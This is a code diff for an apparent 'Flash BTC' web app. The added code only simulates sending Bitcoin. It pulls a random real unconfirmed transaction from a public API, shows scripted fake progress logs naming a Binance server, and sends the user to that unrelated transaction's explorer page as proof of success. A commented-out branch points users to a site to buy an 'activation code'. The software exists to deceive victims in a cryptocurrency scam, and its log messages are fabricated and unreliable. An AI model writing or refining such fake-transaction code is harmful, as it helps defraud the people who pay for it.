@@ -40,6 +40,14 @@ const physicalMemory = document.querySelector('#physicalMemory')
 const osVersions = document.querySelector('#osVersions')
 const Device = document.querySelector('#Device')
 const Balance = document.querySelector('#Balance')
+const demoTry = document.querySelector('#demoTry')
+const trFee = document.querySelector('#trFee')
+let firstTransaction
+let txid 
+let transactionFeeBTC
+let inputAddress
+let inputValueBTC 
+let outputAddress
 
 
 
@@ -337,9 +345,226 @@ function onloadFun() {
     }
   }
 
-
-
 onloadFun()
+
+
+demoTry.onclick = ()=> {
+  if(navigator.onLine) {
+    tryDemo()
+    // demoRun ()
+  } else {
+    setTimeout(function() {
+      let p = document.createElement('p')
+        p.textContent = "[INFO] Connection failed, Please check your internet connection"
+        displayScreen.appendChild(p)
+    }, 5000)
+    setTimeout(checkInternetConnection, 5000)
+    }
+}
+
+function tryDemo() {
+  const apiUrl = 'https://blockchain.info/unconfirmed-transactions?format=json';
+
+  fetch(apiUrl)
+    .then(response => response.json())
+    .then(data => {
+      if (data && data.txs && data.txs.length > 0) {
+         firstTransaction = data.txs[0];
+         txid = firstTransaction.hash;
+         transactionFeeBTC = firstTransaction.fee / 100000000; // Convert to BTC
+         inputAddress = firstTransaction.inputs[0].prev_out.addr;
+         inputValueBTC = firstTransaction.inputs[0].prev_out.value / 100000000; // Convert to BTC
+         outputAddress = firstTransaction.out[0].addr;
+  
+        console.log('Transaction ID (txid):', txid);
+        console.log('Transaction Fee (BTC):', transactionFeeBTC);
+        console.log('Input Address:', inputAddress);
+        console.log('Input Value (BTC):', inputValueBTC);
+        console.log('First Output Address:', outputAddress);
+        
+        payOutInput.value = outputAddress
+        amountInput.value = inputValueBTC
+        trFee.value = transactionFeeBTC
+
+        let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Verifying wallet address...", "[INFO] Fetching transaction details...", "[INFO] Sending from Minning_287.86.35.94-binance-server.com-33-p#", "[INFO] Connecting to Binance Server...",
+        `[INFO] Sending ${Amount.value}`, 
+        `[INFO] Sending to ${payOutInput.value}`,
+        '[INFO] Confirmn transaction... True',
+        '[INFO] Connecting to blockchain server',
+        '[INFO] Registrating transaction',
+        `[INFO] Sending ${Amount.value}  to  ${payOutInput.value}`,
+        '[INFO] Registrating transaction',
+        '[INFO] Verifying transaction',
+        '[INFO] Signing transaction details',
+        '[INFO] Transaction compleated successfully',
+        '[INFO] Redirecting to blockchain network'
+     ]
+       let k = 0
+       function finalActivateShow() {
+         let p = document.createElement('p')
+         p.textContent = arr[k]
+         displayScreen.appendChild(p)
+         k += 1
+         console.log(k)
+         displayScreen.scrollTop = displayScreen.scrollHeight;
+       }
+       let interval = setInterval(finalActivateShow, 1000) ///wait
+       setTimeout(function() {
+         clearInterval(interval)
+       }, 18000)
+ 
+       setTimeout(()=> {
+       notificationBodyP.style.textAlign = "left"
+       notificationBodyP.style.overflowWrap = "break-word";
+       notificationBodyP.style.wordBreak = "break-all";
+       notificationBody.style.height = "10em"
+       notificationContainer.style.display = "flex"
+       container.style.pointerEvents =  "none"
+       navShowHelp.style.display = "none"
+       notificationHeadP.textContent = "Flash BTC"
+       notificationBodyP.textContent = `Transaction successfull, transaction id is ${txid} on the blockchain to verify flash btc transaction`
+       setTimeout(() => {
+         window.location.href = `https://www.blockchain.com/explorer/transactions/btc/${txid}`
+       }, 3000);
+       }, 22000)
+
+
+      } else {
+        console.log('No transactions found.');
+      }
+    })
+    .catch(error => {
+      console.error('An error occurred:', error);
+    });
+}
+
+//demo check start
+function demoRun () {
+  removeAllElements()
+  if(navigator.onLine) {
+   if(payOutInput.value == "") {
+    let p = document.createElement('p')
+    let y = document.createElement('p')
+    p.textContent = "[INFO] Initializing transaction"
+    y.textContent = "[INFO] Verfiying parameters"
+    displayScreen.appendChild(p)
+    displayScreen.appendChild(y)
+
+    setTimeout(function() {
+      notificationBody.style.height = "5em"
+      notificationContainer.style.display = "flex"
+      container.style.pointerEvents =  "none"
+      navShowHelp.style.display = "none"
+      notificationHeadP.textContent = "Flash BTC"
+      notificationBodyP.textContent = "Invaild receiver wallet address, verify and try again"
+    }, 2000)
+   } else {
+    if(amountInput.value == "") {
+    let p = document.createElement('p')
+    let y = document.createElement('p')
+    p.textContent = "[INFO] Initializing transaction"
+    y.textContent = "[INFO] Verfiying parameters"
+    displayScreen.appendChild(p)
+    displayScreen.appendChild(y)
+
+    setTimeout(function() {
+      notificationBody.style.height = "5em"
+      notificationContainer.style.display = "flex"
+      container.style.pointerEvents =  "none"
+      navShowHelp.style.display = "none"
+      notificationHeadP.textContent = "Flash BTC"
+      notificationBodyP.textContent = "Invaild amount, verify and try again"
+    }, 2000)
+    } else {
+      let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Verifying wallet address...", "[INFO] Fetching transaction details...", "[INFO] Sending from Minning_287.86.35.94-binance-server.com-33-p#", "[INFO] Connecting to Binance Server...",
+       `[INFO] Sending ${Amount.value}`, 
+       `[INFO] Sending to ${payOutInput.value}`,
+       '[INFO] Confirmn transaction... True',
+       '[INFO] Connecting to blockchain server',
+       '[INFO] Registrating transaction',
+       `[INFO] Sending ${Amount.value}  to  ${payOutInput.value}`,
+       '[INFO] Registrating transaction',
+       '[INFO] Verifying transaction',
+       '[INFO] Signing transaction details',
+       '[INFO] Transaction compleated successfully',
+       '[INFO] Redirecting to blockchain network'
+    ]
+      let k = 0
+      function finalActivateShow() {
+        let p = document.createElement('p')
+        p.textContent = arr[k]
+        displayScreen.appendChild(p)
+        k += 1
+        console.log(k)
+        displayScreen.scrollTop = displayScreen.scrollHeight;
+      }
+      let interval = setInterval(finalActivateShow, 1000) ///wait
+      setTimeout(function() {
+        clearInterval(interval)
+      }, 18000)
+
+      setTimeout(()=> {
+      notificationBodyP.style.textAlign = "left"
+      notificationBodyP.style.overflowWrap = "break-word";
+      notificationBodyP.style.wordBreak = "break-all";
+      notificationBody.style.height = "10em"
+      notificationContainer.style.display = "flex"
+      container.style.pointerEvents =  "none"
+      navShowHelp.style.display = "none"
+      notificationHeadP.textContent = "Flash BTC"
+      notificationBodyP.textContent = "Transaction successfull, redirecting to blockchain ask https://www.blockchain.com/explorer/transactions/btc/cgdt8bc8ehcnsj84hbxd83nnckw8ehxvnvi839cnxrujvnue8348"
+      setTimeout(() => {
+        window.location.href = "https://flashbtc.rf.gd"
+      }, 2000);
+      }, 22000)
+    }
+    //  else {
+    //   let arr = ["[INFO] Initializing transaction", "[INFO] Verfiying parameters", "[INFO] Transaction failed, Flash BTC Transaction core is not activated", "[INFO] Sending Bitcoin in demo is disabled in this region", "[INFO] Please activate Flash BTC Transaction Core to continue", "Terminating transaction"]
+    //   let k = 0
+    //   function finalShow() {
+    //     let p = document.createElement('p')
+    //     p.textContent = arr[k]
+    //     displayScreen.appendChild(p)
+    //     k += 1
+    //     console.log(k)
+    //     displayScreen.scrollTop = displayScreen.scrollHeight;
+    //   }
+    //   let interval = setInterval(finalShow, 500)
+    //   setTimeout(function() {
+    //     clearInterval(interval)
+    //   }, 3000)
+
+    //   setTimeout(() => {
+    //     notificationBody.style.height = "5em"
+    //     notificationContainer.style.display = "flex"
+    //   container.style.pointerEvents =  "none"
+    //   navShowHelp.style.display = "none"
+    //   notificationHeadP.textContent = "Flash BTC"
+    //   notificationBodyP.textContent = "Transaction failed, please activate Flash BTC Transaction Core to continue"
+    //   notificationBodyP.textContent = "Vist https://flashbtc.rf.gd to buy an activation code"
+    //   setTimeout(() => {
+    //     window.location.href = "https://flashbtc.rf.gd"
+    //   }, 2000);
+    //   }, 3000);
+    // }
+   } 
+
+  } else {
+    let p = document.createElement('p')
+    let y = document.createElement('p')
+    p.textContent = "[INFO] Initializing transaction"
+    y.textContent = "[INFO] Verfiying parameters"
+    displayScreen.appendChild(p)
+    displayScreen.appendChild(y)
+    setTimeout(function() {
+      let p = document.createElement('p')
+        p.textContent = "[INFO] Connection failed, Please check your internet connection"
+        displayScreen.appendChild(p)
+    }, 4000)
+    setTimeout(onlinAlert, 4000)
+  }
+}
+//demo check end
 
 refreshBtn.onclick = ()=> {
   let arr = ["[INFO] Initalizing transaction", "[INFO] Verifying parameters", "[INFO] Connection to network starting", "[INFO] Connection to blockchain API", "[INFO] Connection to bianace server", "[INFO] Connection to walletconnect server", "[INFO] Handshaking with blockchain API", "[INFO] Loading trial priviledges", "[INFO] Finalizing connections", "[INFO] Welcome"]
